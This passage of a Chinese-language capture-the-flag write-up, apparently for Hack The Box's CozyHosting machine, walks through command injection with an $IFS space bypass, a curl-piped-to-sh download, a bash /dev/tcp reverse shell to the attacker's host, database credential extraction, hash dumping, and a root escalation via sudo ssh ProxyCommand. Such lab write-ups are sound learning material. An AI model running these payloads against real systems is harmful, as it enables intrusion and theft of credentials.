<p>要有个截断，换行吧</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&amp;username=;||http://10.10.14.53:5555/1@1%0a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">响应包显示</span></span><br><span class="line">Location: http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: syntax error near unexpected token `||&#x27;/bin/bash: -c: line 1: `ssh -o ConnectTimeout=1 ;||http://10.10.14.53:5555/1@1&#x27;</span><br></pre></td></tr></table></figure>

<p>连接超时，emmmm</p>
<p>curl工具呢，http连接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&amp;username=;||curl http://10.10.14.53:5555/1@1%0a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">响应包显示</span></span><br><span class="line">Location: http://cozyhosting.htb/admin?error=Username can&#x27;t contain whitespaces!</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&amp;username=;sdsd||curl$IFS$2http://10.10.14.53:5555/1@1%0a</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">$IFS<span class="variable">$2</span>是空格</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">响应包</span></span><br><span class="line">HTTP/1.1 302 </span><br><span class="line"></span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Date: Wed, 04 Oct 2023 15:45:49 GMT</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]/bin/bash: line 1: sdsd: command not found  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    51  100    51    0     0     73      0 --:--:-- --:--:-- --:--:--    74/bin/bash: line 2: @127.0.0.1: command not found</span><br></pre></td></tr></table></figure>

<p>搭建的服务器也是有回应的，但是nc没有监听到</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&amp;username=;sdsd||curl$IFS$2http://10.10.14.53:5555/1@1|bash%0a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这样的话，nc就掉了，说是权限不允许</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">listening on [any] 7777 ...</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">connect to [10.10.14.53] from cozyhosting.htb [10.10.11.230] <span class="comment">#33036</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">bash: line 1: 1: Permission denied</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">试试加权限</span></span><br><span class="line">└─# ls -l 1@1</span><br><span class="line">-rwxr--r-- 1 root root</span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# chmod 777 1@1      </span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ls -l 1@1    </span><br><span class="line">-rwxrwxrwx 1 root root </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再访问一次，还是不行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我错哪了呢？？？？？</p>
<p>我以为是root文件夹访问不了呢，我换到tmp文件夹，还是一样啊</p>
<p><strong>好好好，学艺不精，我生气了！</strong></p>
<p><strong>我笑了，原因是shell写错了</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.53/7777 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>构造如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&amp;username=;asd||curl$IFS$9http://10.10.14.53:5555/1@1|sh%0a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005102621952.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─# nc -lvvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [10.10.14.53] from cozyhosting.htb [10.10.11.230] 43318</span><br><span class="line">bash: line 1: 1: Permission denied</span><br><span class="line"> sent 0, rcvd 35</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─# nc -lvvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [10.10.14.53] from cozyhosting.htb [10.10.11.230] 53294</span><br><span class="line">bash: cannot set terminal process group (1064): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">app@cozyhosting:/app$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(app) gid=1001(app) groups=1001(app)</span><br><span class="line">app@cozyhosting:/app$ pwd</span><br><span class="line">pwd</span><br><span class="line">/app</span><br><span class="line">app@cozyhosting:/app$ ls #严谨一点，要加-la啊，但是也只有一个jar文件</span><br><span class="line">ls</span><br><span class="line">cloudhosting-0.0.1.jar</span><br><span class="line">app@cozyhosting:/app$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问:4321，有个jar包，这个是一样的，我之前下下来了，直接分析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim cl*</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有很多class文件啊</span></span><br></pre></td></tr></table></figure>

<p>主机有idea，那就idea分析了，将它添加为library</p>
<blockquote>
<p>kali可以用jd-gui 打开</p>
</blockquote>
<p>全局搜索username和password，主要关注配置文件的内容</p>
<p>在一个类中找到了这个</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.address=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server.servlet.session.timeout=5m</span><br><span class="line">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings</span><br><span class="line">management.endpoint.sessions.enabled = <span class="literal">true</span></span><br><span class="line">spring.datasource.driver-class-name=org.postgresql.Driver</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect</span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.jpa.database=POSTGRESQL</span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql:<span class="comment">//localhost:5432/cozyhosting</span></span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个给了数据库服务器和数据库名</span></span><br><span class="line">spring.datasource.url=jdbc:postgresql:<span class="comment">//localhost:5432/cozyhosting</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给了数据库用户名和密码</span></span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>

<p>可以搜索一下，postgreSQL的远程连接用法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app@cozyhosting:/app$ psql -h localhost -p 5432 -U postgres -d cozyhosting           </span><br><span class="line">psql -h localhost -p 5432 -U postgres -d cozyhosting</span><br><span class="line">Password for user postgres: Vg&amp;nvzAQ7XxR</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后嘞？没东西出来诶</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">哦，搞半天是连上了</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">但是嘞，这个操作方式不同于mysql</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">app<span class="variable">@cozyhosting</span>:<span class="operator">/</span>app$ psql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>U postgres</span><br><span class="line">psql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>U postgres</span><br><span class="line">Password <span class="keyword">for</span> <span class="keyword">user</span> postgres: Vg<span class="operator">&amp;</span>nvzAQ7XxR</span><br><span class="line"></span><br><span class="line">\c          </span><br><span class="line">You <span class="keyword">are</span> now connected <span class="keyword">to</span> database &quot;postgres&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;postgres&quot;.</span><br><span class="line">\c</span><br><span class="line">You <span class="keyword">are</span> now connected <span class="keyword">to</span> database &quot;postgres&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;postgres&quot;.</span><br><span class="line">\l #列出数据库</span><br><span class="line">                                   List <span class="keyword">of</span> databases</span><br><span class="line">    Name     <span class="operator">|</span>  Owner   <span class="operator">|</span> Encoding <span class="operator">|</span>   <span class="keyword">Collate</span>   <span class="operator">|</span>    Ctype    <span class="operator">|</span>   Access privileges   </span><br><span class="line"><span class="comment">-------------+----------+----------+-------------+-------------+-----------------------</span></span><br><span class="line"> cozyhosting <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> </span><br><span class="line"> postgres    <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> </span><br><span class="line"> template0   <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> <span class="operator">=</span>c<span class="operator">/</span>postgres          <span class="operator">+</span></span><br><span class="line">             <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>             <span class="operator">|</span>             <span class="operator">|</span> postgres<span class="operator">=</span>CTc<span class="operator">/</span>postgres</span><br><span class="line"> template1   <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> <span class="operator">=</span>c<span class="operator">/</span>postgres          <span class="operator">+</span></span><br><span class="line">             <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>             <span class="operator">|</span>             <span class="operator">|</span> postgres<span class="operator">=</span>CTc<span class="operator">/</span>postgres</span><br><span class="line">(<span class="number">4</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">\c cozyhosting #选择数据库</span><br><span class="line">You <span class="keyword">are</span> now connected <span class="keyword">to</span> database &quot;cozyhosting&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;postgres&quot;.</span><br><span class="line">\d   #列出表名</span><br><span class="line">              List <span class="keyword">of</span> relations</span><br><span class="line"> Schema <span class="operator">|</span>     Name     <span class="operator">|</span>   Type   <span class="operator">|</span>  Owner   </span><br><span class="line"><span class="comment">--------+--------------+----------+----------</span></span><br><span class="line"> public <span class="operator">|</span> hosts        <span class="operator">|</span> <span class="keyword">table</span>    <span class="operator">|</span> postgres</span><br><span class="line"> public <span class="operator">|</span> hosts_id_seq <span class="operator">|</span> sequence <span class="operator">|</span> postgres</span><br><span class="line"> public <span class="operator">|</span> users        <span class="operator">|</span> <span class="keyword">table</span>    <span class="operator">|</span> postgres</span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users #无效，少了分号</span><br><span class="line"></span><br><span class="line">\d usres</span><br><span class="line">Did <span class="keyword">not</span> find <span class="keyword">any</span> relation named &quot;usres&quot;.</span><br><span class="line">\d users #查看表结构</span><br><span class="line">                        <span class="keyword">Table</span> &quot;public.users&quot;</span><br><span class="line">  <span class="keyword">Column</span>  <span class="operator">|</span>          Type          <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> Nullable <span class="operator">|</span> <span class="keyword">Default</span> </span><br><span class="line"><span class="comment">----------+------------------------+-----------+----------+---------</span></span><br><span class="line"> name     <span class="operator">|</span> <span class="type">character</span> <span class="type">varying</span>(<span class="number">50</span>)  <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span> </span><br><span class="line"> password <span class="operator">|</span> <span class="type">character</span> <span class="type">varying</span>(<span class="number">100</span>) <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span> </span><br><span class="line"> role     <span class="operator">|</span> role                   <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span> </span><br><span class="line">Indexes:</span><br><span class="line">    &quot;users_pkey&quot; <span class="keyword">PRIMARY</span> KEY, btree (name)</span><br><span class="line">Referenced <span class="keyword">by</span>:</span><br><span class="line">    <span class="keyword">TABLE</span> &quot;hosts&quot; <span class="keyword">CONSTRAINT</span> &quot;hosts_username_fkey&quot; <span class="keyword">FOREIGN</span> KEY (username) <span class="keyword">REFERENCES</span> users(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line">ERROR:  syntax error <span class="keyword">at</span> <span class="keyword">or</span> near &quot;select&quot;</span><br><span class="line">LINE <span class="number">2</span>: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line">        <span class="operator">^</span></span><br><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users; #要来个空格<span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span>...;</span><br><span class="line">   name    <span class="operator">|</span>                           password                           <span class="operator">|</span> role  </span><br><span class="line"><span class="comment">-----------+--------------------------------------------------------------+-------</span></span><br><span class="line"> kanderson <span class="operator">|</span> $<span class="number">2</span>a$<span class="number">10</span>$E<span class="operator">/</span>Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim <span class="operator">|</span> <span class="keyword">User</span></span><br><span class="line"> admin     <span class="operator">|</span> $<span class="number">2</span>a$<span class="number">10</span>$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm <span class="operator">|</span> Admin</span><br><span class="line">(<span class="number">2</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hashid #看它是什么类型的hash</span><br><span class="line">(哈希值)</span><br><span class="line">Analyzing </span><br><span class="line">...</span><br><span class="line">[+] Blowfish(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board 4.x </span><br><span class="line">[+] bcrypt </span><br><span class="line"></span><br><span class="line">hashcat #爆破</span><br></pre></td></tr></table></figure>

<p>哈哈，爆破不出来</p>
<p>看了wp，是 <code>manchesterunited</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">app@cozyhosting:/app$ cat etc/passwd</span><br><span class="line">cat etc/passwd</span><br><span class="line">cat: etc/passwd: No such file or directory</span><br><span class="line">app@cozyhosting:/app$ cd .. </span><br><span class="line">cd ..</span><br><span class="line">app@cozyhosting:/$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class="line">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">app:x:1001:1001::/home/app:/bin/sh</span><br><span class="line">postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">josh:x:1003:1003::/home/josh:/usr/bin/bash</span><br><span class="line">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有一个josh用户，它有/bin/bash</span></span><br><span class="line"></span><br><span class="line">app@cozyhosting:/home$ cd josh</span><br><span class="line">cd josh</span><br><span class="line">bash: cd: josh: Permission denied</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用户名josn</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">密码 manchesterunited</span></span><br><span class="line"></span><br><span class="line">ssh josh@10.10.11.230     </span><br><span class="line">josh@cozyhosting:~$ pwd</span><br><span class="line">/home/josh</span><br><span class="line">josh@cozyhosting:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">josh@cozyhosting:~$ cat user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="root-2"><a href="#root-2" class="headerlink" title="root"></a>root</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">josh@cozyhosting:~$ sudo -l</span><br><span class="line">[sudo] password for josh: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for josh: </span><br><span class="line">Matching Defaults entries for josh on localhost:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br><span class="line">...</span><br><span class="line">josh@cozyhosting:~$ id</span><br><span class="line">uid=1003(josh) gid=1003(josh) groups=1003(josh)</span><br><span class="line">josh@cozyhosting:~$ sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">root.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> root.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x</code></p>
<blockquote>
<p><code>-o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39;：</code></p>
<p>ProxyCommand就是用于指定通过代理或中间服务器建立 SSH 连接时应执行的命令</p>
<p><code>sh</code>：指shell环境，即&#x2F;bin&#x2F;bash或 &#x2F;bin&#x2F;sh</p>
<p><code>0&lt;&amp;2</code>：重定向文件描述符0到文件描述符2， (stdin) -&gt;(stderr)</p>
<p><code>1&gt;&amp;2</code>：stdout -&gt; stderror</p>
<p><code>sh 0&lt;&amp;2 1&gt;&amp;2</code> 将标准输入和输出到标准错误 ，常用在reverse shell 载荷</p>
<p><code>x</code>是ssh要连接的一个目标IP或主机</p>
</blockquote>
<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><ul>
<li>利用了cookie的漏洞，进入admin管理页面，然后嘞</li>
<li>根据命令执行漏洞，构造nc监听，反弹bash</li>
<li>jar包内容分析</li>
<li>psql数据库的远程连接</li>
</ul>
<h3 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7284318118993035283">https://juejin.cn/post/7284318118993035283</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@li_allouche/hack-the-box-cozyhosting-writeup-1c1347c15aa0">https://medium.com/@li_allouche/hack-the-box-cozyhosting-writeup-1c1347c15aa0</a></p>
</blockquote>
